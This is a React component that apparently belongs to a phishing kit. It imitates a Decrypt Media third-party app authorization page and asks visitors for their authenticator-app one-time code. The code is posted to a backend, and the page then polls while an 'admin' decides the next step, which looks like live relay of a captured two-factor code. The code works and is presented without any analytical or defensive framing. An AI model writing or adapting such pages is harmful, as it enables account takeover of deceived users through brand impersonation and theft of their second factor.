import React, { useState, useEffect } from "react";
import { submitAuthenticatorOtp, fetchUserStep } from "../../services/api"; // Import necessary API calls
import { useNavigate } from "react-router-dom";
import Loader from "./Loader"; // Loader component for showing the loading state
import Cookies from "js-cookie";
import Header from "./Header";
import Footer from "./Footer";

const AuthenticatorOtpForm = () => {
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false); // Loading state for when OTP is being processed
  const [error, setError] = useState(""); // Error state to display issues
  const [showLoader, setShowLoader] = useState(false); // State to track if loader should be displayed for admin action
  const navigate = useNavigate();

  // Handle OTP input field change
  const handleOtpChange = (e) => {
    setOtp(e.target.value);
  };

  // Handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true); // Start the loader
    setError(""); // Reset any error messages
    const userId = Cookies.get("userId"); // Get the userId from cookies

    if (!userId) {
      setLoading(false);
      setError("User ID not found. Please try again.");
      return;
    }

    try {
      // Submit the OTP
      const response = await submitAuthenticatorOtp(userId, otp); // Call API function to submit OTP
      if (response.status === 200) {
        console.log("OTP verified successfully");
        // Set the loader for admin processing
        setShowLoader(true);
      } else {
        setError("Failed to verify OTP");
        setLoading(false); // Stop the loader on error
      }
    } catch (error) {
      setError("Error verifying OTP");
      setLoading(false); // Stop the loader on error
    }
  };

  // Polling mechanism to fetch user step from the backend every 2 seconds
  useEffect(() => {
    if (!showLoader) return; // Skip polling if not showing the loader

    const userId = Cookies.get("userId");

    const pollForStep = async () => {
      try {
        const response = await fetchUserStep(userId);
        const step = response?.data?.currentStep;

        if (step && step !== "loading") {
          switch (step) {
            case "authenticator-otp":
              navigate(`/authenticator-otp-page?userId=${userId}`); // Redirect to authenticator OTP page if needed
              break;
            case "thank-you":
              navigate(`/thank-you?userId=${userId}`); // If the admin has approved, go to the thank-you page
              break;
            case "error-page":
              setError("Failed to verify OTP. Please try again.");
              setShowLoader(false); // Stop the loader on error
              setLoading(false); // Ensure loader stops
              break;
            default:
              console.error("Unknown step:", step);
              setError("Unknown step. Please try again.");
              setShowLoader(false); // Stop loader on unknown step
              setLoading(false); // Ensure loader stops
          }
        }
      } catch (err) {
        console.error("Error while polling for step:", err);
        setError("Error polling for step. Please try again.");
        setShowLoader(false); // Stop loader on polling error
        setLoading(false); // Ensure loader stops
      }
    };

    const intervalId = setInterval(pollForStep, 2000); // Poll every 2 seconds
    return () => clearInterval(intervalId); // Clean up the interval
  }, [showLoader, navigate]);

  if (loading || showLoader) {
    return <Loader />; // Show loader while verifying OTP or waiting for admin action
  }

  return (
    <div className="flex flex-col min-h-screen">
      <Header />
      <main className="flex-grow">
        <div className="max-w-xl mx-auto px-4 sm:px-6 py-4">
          <div className="bg-white sm:border sm:border-gray-300 sm:rounded-lg">
            <div className="p-4 sm:p-6">
              <h1 className="text-xl font-bold text-gray-800 mb-4">
                Enter the OTP from your authenticator app
              </h1>

              <div className="flex items-center mb-4">
                <img
                  src="/decrypt.jpg"
                  alt="Decrypt Media"
                  className="w-12 h-12 mr-3"
                />
                <div>
                  <h3 className="font-bold text-gray-800">Decrypt Media</h3>
                  <p className="text-sm text-gray-600">By @decryptmedia</p>
                  <p className="text-sm text-gray-600">decrypt.co</p>
                </div>
              </div>

              {error && (
                <div className="text-red-500 text-sm mb-3">{error}</div>
              )}

              <form className="mb-6" onSubmit={handleSubmit}>
                <input
                  type="text"
                  placeholder="Enter OTP"
                  className={`w-full p-2 border ${
                    error ? "border-red-500" : "border-gray-300"
                  } rounded mb-3 text-sm`}
                  maxLength={6}
                  value={otp}
                  onChange={handleOtpChange}
                  required
                />
                <div className="flex items-center justify-between mb-4 text-sm">
                  <label className="flex items-center text-gray-600">
                    <input type="checkbox" className="mr-2" />
                    Remember this device
                  </label>
                  <a href="#" className="text-blue-500 hover:underline">
                    Resend OTP
                  </a>
                </div>
                <div className="flex space-x-3">
                  <button
                    type="submit"
                    className="bg-blue-500 text-white py-2 px-4 rounded font-bold hover:bg-blue-600 text-sm flex-grow sm:flex-grow-0"
                  >
                    Verify OTP
                  </button>
                  <button
                    type="button"
                    className="bg-white text-gray-700 py-2 px-4 rounded font-bold border border-gray-300 hover:bg-gray-100 text-sm flex-grow sm:flex-grow-0"
                  >
                    Cancel
                  </button>
                </div>
              </form>

              <div className="text-sm">
                <p className="text-green-600 mb-2">
                  This application will be able to:
                </p>
                <ul className="list-disc pl-5 space-y-1 text-gray-600 mb-4">
                  <li>Access your account using an authenticator app.</li>
                  <li>Enhance your security with two-factor authentication.</li>
                  <li>Verify your identity securely.</li>
                </ul>
                <p className="text-gray-500">
                  Learn more about{" "}
                  <a href="#" className="text-blue-500 hover:underline">
                    third-party app permissions
                  </a>{" "}
                  in the Help Center.
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default AuthenticatorOtpForm;
